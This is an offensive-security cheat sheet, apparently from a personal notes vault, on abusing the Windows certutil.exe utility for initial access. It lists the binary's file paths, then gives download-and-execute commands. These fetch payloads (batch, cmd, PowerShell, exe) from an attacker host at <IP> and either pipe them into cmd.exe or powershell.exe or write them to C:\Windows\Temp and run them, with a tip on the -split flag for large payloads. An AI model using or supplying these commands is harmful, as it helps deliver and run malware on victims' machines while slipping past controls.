# CertUtil

## 01 - Common Files

```
C:\Windows\System32\certutil.exe
C:\Windows\SysWOW64\certutil.exe
```

## 02 - Execute Payloads

### 2.1 - Fileless Code Execution

```
C:\> certutil.exe -urlcache -f http[s]://<IP>/payload.bat | cmd.exe

C:\> certutil.exe -urlcache -f http[s]://<IP>/payload.cmd | cmd.exe

C:\> certutil.exe -urlcache -f http[s]://<IP>/payload.ps1 | powershell.exe
```

### 2.2 - Dropping On Disk

Download payload and execute it.

```
C:\> certutil.exe -urlcache -f http[s]://<IP>/payload.exe C:\Windows\Temp\payload.exe  & C:\Windows\Temp\payload.exe
```

Download the large payload.

> [!TIP] Downloading Large Payloads
> The `-split` flag is great for downloading a large payload.

```
C:\> certutil.exe -urlcache -split -f http[s]://<IP>/payload.exe C:\Windows\Temp\payload.exe  & C:\Windows\Temp\payload.exe
```

---
## References

### Backlinks

- [[07 - Tactics & Techniques & Procedures Phases/C - Initial Access/0x01 - Weaponization/0xB - Client-Side Attacks/Delivery Methods/Command and Scripting Interpreter/Desktop/Windows/Code Execution/Batch]]